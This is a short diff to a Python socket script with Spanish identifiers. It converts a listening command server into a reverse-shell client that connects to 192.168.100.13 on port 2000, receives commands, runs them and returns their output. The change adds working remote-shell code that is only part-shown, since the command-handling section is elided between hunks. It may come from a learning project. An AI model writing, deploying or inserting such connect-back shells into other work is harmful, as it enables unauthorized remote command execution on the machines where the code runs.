@@ -2,17 +2,14 @@ import socket
 import os
 import subprocess
 
-direccion = ('192.168.100.17', 10000)
+direccion = ('192.168.100.13', 2000)
  
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
-    cliente.bind(direccion)
-    cliente.listen(4)
-    print(f'Listen in port {direccion[1]}')
-    client, addr = cliente.accept()
-    print(f'Accept: {client}, address: {addr}')
+    cliente.connect(direccion)
+    print(f'Connect to {direccion}')
     while True:
-        cmd, addr = client.recvfrom(1024)
-        cmd = cmd.decode()
+        cmd = cliente.recv(1024).decode()
+        
         if len(cmd) <= 1:
             resultado = ''
 
@@ -39,4 +36,4 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
         else:
             resultado = f'No se reconoce el comnado {cmd}'
 
-        client.sendto(resultado.encode(), addr)
+        cliente.send(resultado.encode())
